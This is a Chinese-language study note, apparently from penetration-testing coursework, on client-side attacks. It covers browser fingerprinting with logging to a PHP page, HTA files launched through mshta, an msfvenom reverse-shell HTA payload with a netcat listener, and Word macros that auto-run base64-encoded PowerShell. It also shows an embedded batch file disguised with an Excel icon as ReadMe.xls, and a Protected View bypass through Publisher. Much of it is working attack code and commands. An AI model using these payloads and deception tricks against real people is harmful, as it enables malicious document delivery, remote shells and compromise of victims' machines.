# 11-Client Attacks

客户端攻击向量尤其阴险，因为它们利用客户端软件(如浏览器)的弱点，而不是利用服务器软件。这通常包括一些形式的用户交互和欺骗，以便客户端软件执行恶意代码。

## 了解你的目标

### 被动信息收集

从攻击者的角度来看，客户端攻击的主要困难在于受害者客户端软件的枚举，这远没有WWW或FTP服务器的枚举那么简单。成功进行客户端攻击的秘诀是，与渗透测试相关的大多数事情一样，准确而彻底地收集信息。

通过Google进行检索目标的IP地址等信息，我们经常可以在社交媒体和论坛网站上找到相关信息。事实上，我们甚至发现泄露的照片上显示了操作系统类型和版本、应用程序版本、正在使用的防病毒应用程序等等信息。花在研究上的时间是不会浪费的。

### 主动信息收集

这可能涉及给用户打电话，试图获取有用的信息，或向受害者发送目标电子邮件，希望点击一个链接，该链接将列举目标的操作系统版本、浏览器版本和已安装的扩展。

#### 社会工程和客户端攻击

> wiki：https://en.wikipedia.org/wiki/Social_engineering_(security)

#### 客户端指纹识别

Web浏览器通常是收集目标信息的良好载体。它们在功能上的发展、复杂性和丰富性已经成为最终用户和攻击者的双刃剑。

我们可以创建自己的自定义工具，但是有很多开源的指纹项目，而且最可靠的通常是那些直接利用通用客户端组件(如JavaScript)的项目。

原文中使用的fingerprintjs2，现在作者已经将项目迁移了，变成了收费的，他还有一个fingerprintjs的项目，免费的临时拿来用一下吧。

> fingerprint：https://github.com/fingerprintjs/fingerprintjs

下面是一个快速启动的小实例

```
<html><body>
<script>
  function initFingerprintJS() {
    FingerprintJS.load().then(fp => {
      // The FingerprintJS agent is ready.
      // Get a visitor identifier when you'd like to.
      fp.get().then(result => {
        // This is the visitor identifier:
        
        console.log(JSON.stringify(result));
      });
    });
  }
</script>
<script
  async
  src="//cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"
  onload="initFingerprintJS()"
></script>
</body></html>
```

我用kali开启apache服务，然后放在目录下，再用浏览器去访问时，控制台会输出相关信息。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605927546768-7307d9ab-1b98-4ef6-8f2f-fcd25d0611b2.png)

但是因为是开源版本，有用的信息很少，大家可以找找看没有替代品的。

现在还只是在客户端显示出来，我们利用异步请求访问一个php网页，然后php网页在服务器进行保存文件。

```
<html><body>
<script>
  function initFingerprintJS() {
    FingerprintJS.load().then(fp => {
      // The FingerprintJS agent is ready.
      // Get a visitor identifier when you'd like to.
      fp.get().then(result => {
        // This is the visitor identifier:
        var d1 = new Date();
        details = JSON.stringify(result);
        var xmlhttp = new XMLHttpRequest(); 
        xmlhttp.open("POST", "/fp/js.php"); 
        xmlhttp.setRequestHeader("Content-Type", "application/txt"); 
        xmlhttp.send(d1 + details);
      });
    });
  }
</script>
<script
  async
  src="//cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"
  onload="initFingerprintJS()"
></script>
</body></html>
<?php $data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n"; 
$data .= file_get_contents('php://input');
$data .= "---------------------------------\n\n";
file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX); 
?>
```

对了，如果要执行代码，需要让apache对目录有权限：

```
sudo chown www-data:www-data fp
```

## 利用HTML应用程序

将注意力转向特定的客户端攻击，我们将首先关注HTML应用程序。

如果用.hta而不是. HTML扩展名创建文件，Internet Explorer将自动将其解释为HTML应用程序，并提供使用mshta.exe程序执行它的能力。

HTML应用程序的目的是允许直接从Internet Explorer任意执行应用程序，而不是下载和手动运行可执行文件。因为这与Internet Explorer中的安全边界冲突，所以HTML应用程序总是在浏览器的安全上下文之外由microsoft签名的二进制mshta.exe执行。如果用户允许这种情况发生，则攻击者可以使用该用户的权限执行任意代码，从而避免Internet Explorer通常施加的安全限制。

虽然这个攻击只对Internet Explorer和某种程度上的Microsoft Edge起作用，但它仍然有用，因为许多公司依赖Internet Explorer作为他们的主要浏览器。此外，这个攻击利用功能直接内置到Windows操作系统，更重要的是，它兼容不太安全的微软遗留web技术，如ActiveX。

### 探索HTML应用程序

与HTML页面类似，典型的HTML应用程序包括HTML、正文和脚本标记，后面跟着JavaScript或VBScript代码。然而，由于HTML应用程序是在浏览器之外执行的，所以我们可以自由地使用在浏览器中经常被阻止的遗留和危险的特性。

```
<html> <body>
<script>
    var c = 'cmd.exe' 
    new ActiveXObject('WScript.Shell').Run(c);
</script>
</body> </html>
```

用IE打开会出现下面的提示：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605929324226-a4521d65-6eea-4e1e-b42e-de0c64613c67.png)

有时也会出现警告：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605929351703-ecaf14cf-1895-413a-95d1-7e81c0a9967f.png)

然后此代码的效果就是打开一个cmd窗口：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605929376065-48ca13a0-8a28-4d2c-a12c-1d6f220b11ff.png)

但是会发现有一个残留窗口：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605929410618-4417746f-a3fc-48b8-8f7f-244c9cb01465.png)  如果不希望出现这个，我们在它执行完打开cmd之后，将其关闭。

```
<html> <body>
<script>
    var c = 'cmd.exe' 
    new ActiveXObject('WScript.Shell').Run(c);
</script>
<script>
    self.close(); 
</script>
</body> </html>
```

### HTA Attack in Action

我们将使用msfvenom将基本的HTML应用程序转化为攻击，依靠hta-psh输出格式创建基于PowerShell的HTA有效负载。在清单中，将生成完整的反向shell有效负载并保存到文件evil.hta。

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

我们通过cat命令查看一下文件的内容，可以看到变量名是随机的，然后PowerShell在使用时用了一些选项，第一个参数-nop是-NoProfile的简写，它指示PowerShell不要加载PowerShell用户配置文件。接下来，我们的脚本使用-w hidden (-WindowStyle hidden的简写)为了避免创建窗口在用户的桌面上。最后，极其重要的-e标志(-EncodedCommand的简写)允许我们直接提供Base64编码的349 PowerShell脚本作为命令行参数。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605941447385-47717c45-ded0-479e-af66-59ce2878f71e.png)

然后我们在kali上用nc监听一下端口， `nc -lnvp 4444` ，然后windows去访问evil.eta，执行之后正常的话应该会出现下面这种结果。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605942862666-a23cdc91-f77a-4886-a5f9-89d512fb09e1.png)

## 利用Microsoft Office

在利用客户端漏洞时，使用受害者在日常工作中信任的应用程序是很重要的。与可能看起来可疑的web链接不同，Microsoft Office 的客户端攻击通常能够成功，因为很难区分恶意内容和良性内容。

### Microsoft Word 宏

> 我目前的环境没有Office，所以下面的内容都是基于原文内容

像Word和Excel这样的Microsoft Office应用程序允许用户嵌入宏，宏是一组命令和指令，以编程方式完成一项任务。组织经常使用宏来管理动态内容并将文档与外部内容链接起来。更有趣的是，宏可以在Visual Basic for Applications (VBA)中从头开始编写，它是一种功能完整的脚本语言，可以完全访问ActiveX对象和Windows脚本主机，类似于HTML应用程序中的JavaScript。

创建microsoft word宏就是选择视图功能区然后选择宏。如图所示，我们只需为宏输入一个名称，然后在下拉列表中选择宏将要插入的文档的名称。当我们单击Create时，一个简单的宏框架将插入到我们的文档中。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605943357342-83aeba33-878e-45a9-bbc7-979e051b62d7.png)

让我们检查一下简单的宏并讨论VBA的基本原理。在VBA宏中使用的主要过程以关键字Sub开始，以End Sub结束。这基本上标志了宏的主体。

现在，我们的新宏MyMacro()只是一个空过程和几行以撇号开头的代码，它在VBA中标志注释的开始。

```
Sub MyMacro() 
' 
' MyMacro Macro 
' 
'
End Sub
```

要像前面那样通过ActiveX调用Windows脚本主机，可以使用CreateObject 函数和Wscript.Shell运行方法。该宏的代码如下所示:

```
Sub MyMacro() 
    CreateObject("Wscript.Shell").Run "cmd" 
End Sub
```

由于Office宏不是自动执行的，所以我们必须使用两个预定义的过程，即AutoOpen过程和Document_Open过程，前者在打开新文档时执行，后者在重新打开已打开的文档时执行。这两个过程都可以调用我们的自定义过程，从而运行我们的代码。

```
Sub AutoOpen() 
    MyMacro 
End Sub 
Sub Document_Open()
    MyMacro 
End Sub 
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "cmd" 
End Sub
```

我们必须将包含的文档保存为.docm或更旧的.doc格式，后者支持嵌入宏，但必须避免使用不支持宏的.docx格式。

当我们重新打开包含宏的文档时，将会出现一个安全警告，表明宏已经被禁用。我们必须单击Enable Content来运行宏。这是Microsoft Office的默认安全设置，虽然可以完全禁用宏的使用来防范这种攻击，但通常会启用它们，因为它们在大多数环境中都是常用的。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605943573331-830cace5-8ca2-4d32-b423-a6282a330e65.png)

一旦我们按下Enable Content按钮，宏就会执行，命令提示符就会打开。

与最初的HTML应用程序一样，命令执行只是一个开始，但是反向shell会更好。为此，我们将再次使用PowerShell，重用使用base64编码的字符串执行Metasploit shell代码的能力。

为了实现这一点，我们将声明一个字符串类型的变量(Dim)，其中包含我们希望执行的PowerShell命令。我们将在宏中添加一行为字符串变量预留空间:

```
Sub AutoOpen() 
    MyMacro 
End Sub 
Sub Document_Open()
    MyMacro 
End Sub 
Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str 
End Sub
```

我们可以将base64编码的PowerShell脚本嵌入为单个字符串，但是VBA对字符串字面量的限制是255个字符。此限制不适用于存储在变量中的字符串，因此我们可以将命令拆分为多行并连接它们。

可以用个简单的脚本去分割：

```
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
n = 50
for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
```

最后的效果类似下面这个图：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605944007899-0cf99389-a342-487e-b87d-efeac61e9bc5.png)

然后就是在kali监听，windows打开执行文件中的宏。

### 对象链接和嵌入

另一个针对Microsoft Office滥用动态数据交换(DDE) 的流行的客户端攻击，就是从Office文档中执行任意应用程序。但自2017年12月以来，这个问题已经得到修补。

但是，我们仍然可以利用对象链接和嵌入(OLE) 来滥用Microsoft Office的文档嵌入特性。

在这个攻击场景中，我们将在Microsoft Word文档中嵌入一个Windows批处理文件。

Windows批处理文件是一种较老的格式，通常被更现代的Windows本地脚本语言(如VBScript和PowerShell)所取代。然而，批处理脚本仍然完全功能，即使在Windows 10，并允许执行应用程序。下面的清单给出了启动cmd.exe的初始概念验证批处理脚本(launch.bat):

```
START cmd.exe
```

接下来，我们将在Microsoft Word文档中包含上述脚本。我们将打开Microsoft Word，创建一个新文档，导航到插入界面，然后单击对象菜单。在这里，我们将选择创建从文件标签，并选择我们新创建的批处理脚本launch.bat:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605944270467-d6311e4f-c43f-4418-936c-6a767025aeb6.png)

我们还可以在Word文档中更改批处理文件的外观，使其看起来更温和。为此，我们只需选中Display as icon复选框并选择Change icon，就会弹出如图所示的菜单框，允许我们进行更改:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605944294481-0900509c-30d9-482b-8101-709c5776d16e.png)

尽管这是一个嵌入的批处理文件，微软允许我们为它选择一个不同的图标并输入标题，这是受害者将看到的，而不是实际的文件名。在上面的示例中，我们选择了Microsoft Excel的图标以及一个名为ReadMe.xls的名称，以完全屏蔽该批处理文件，试图降低受害者的怀疑。接受菜单选项后，批处理文件被嵌入到Microsoft Word文档中。接下来，受害者必须被诱骗双击它并接受安全警告，如图所示:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605944330620-580d9121-a419-4c78-9214-1e02ba52b098.png)

一旦受害者接受警告，cmd.exe就会启动。同样，我们能够执行任意程序，并且必须使用Base64编码的命令将其转换为PowerShell的执行。这一次，转换非常简单，我们只需将cmd.exe更改为以前使用的PowerShell调用，如下面所示。

```
START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
```

后面也就是kali监听上线就可以了。

### 逃避受保护的视图

上面的微软Word文档在本地提供时非常有效，但从互联网提供时，比如通过电子邮件或下载链接，我们必须绕过另一层被称为保护视图的保护，它禁止文档中的所有编辑和修改，并阻止宏或嵌入对象的执行。

为了模拟这种情况，我们将把包含嵌入式批处理文件的Microsoft Word文档复制到Kali机器上，并将其托管在Apache服务器上。然后我们可以从服务器下载文档，并在受害机器上打开它。此时，受保护视图被使用，如图所示，我们不能执行批处理文件。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605944450122-ec0cd540-47da-433f-bdd3-864f5fe9d303.png)

虽然受害者可能单击启用编辑并退出保护视图，但这是不可能的。理想情况下，我们宁愿完全绕过Protected视图，实现这一点的一种直接方法是使用另一个Office应用程序。

像Microsoft Word一样，Microsoft Publisher允许嵌入对象，并最终以与Word和Excel完全相同的方式执行代码，但不会为互联网传输的文档启用保护视图。我们可以使用之前在Word中应用的策略来绕过这些限制，但缺点是Publisher的安装频率不如Word或Excel。不过，如果您的指纹检测到一个出版商的安装，这可能是一个可行的和更好的矢量。

他这里推荐的是使用另一种类似微软办公软件的软件，这样的话，像国内的wps看起来有点相似。